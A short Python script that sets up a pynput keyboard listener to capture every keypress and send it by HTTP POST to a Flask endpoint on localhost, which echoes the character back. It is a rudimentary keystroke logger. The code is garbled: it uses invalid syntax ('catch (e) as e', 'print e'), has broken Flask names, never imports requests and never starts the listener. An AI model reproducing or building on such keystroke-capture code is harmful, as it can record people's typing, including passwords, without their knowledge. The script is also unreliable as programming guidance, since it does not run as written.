from flask import Flask, request
from pynput import keyboard
import logging

app = Flask(name)



def on_press(key):
    character = str(key)
    # Send the character to the API
    requests.post('http://localhost:5000/keypress', data={'character': character})

# Set up the listener
try:
    listener = keyboard.Listener(on_press=on_press)
catch (e) as e:
    print e


@app.route('/keypress', methods=['POST'])
def keypress():
    # Get the character that was sent in the request
    character = request.form['character']

    # Send the character back to the client as a response
    return character

if name == 'main':
    app.run()